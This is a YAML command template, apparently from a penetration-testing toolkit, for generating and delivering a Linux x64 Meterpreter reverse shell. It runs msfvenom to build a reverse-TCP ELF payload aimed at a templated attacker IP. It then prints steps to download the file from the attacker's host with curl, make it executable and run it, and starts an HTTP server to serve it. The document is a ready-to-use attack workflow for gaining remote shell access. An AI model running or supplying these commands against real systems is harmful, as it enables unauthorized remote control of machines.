---
metadata:
  filename: "deliver-linux-x64-revshell-msfvenom-meterpreter-nonstaged-elf.yaml"
  tags: ["shell", "linux"]
  created: "2025-03-29"
  author: "Unknown"

content: |
  mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
  msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f elf > packstation/outbound/revshell.elf ; \
  echo '================================================================'; \
  echo '                      ------Listener------                      '; \
  echo '1. Start listener: {{ include('scripts/listener-msf-multi-handler-linux-x64-meterpreter-nonstaged.yaml') }}'; \
  echo '================================================================'; \
  echo '                       -----Linux------                         '; \
  echo '2. Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.elf -o {{ delivery_path_linux }}/revshell.elf'; \
  echo '3. Make executable: chmod +x {{ delivery_path_linux }}/revshell.elf'; \
  echo '4. Execute: {{ delivery_path_linux }}/revshell.elf'; \
  echo '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
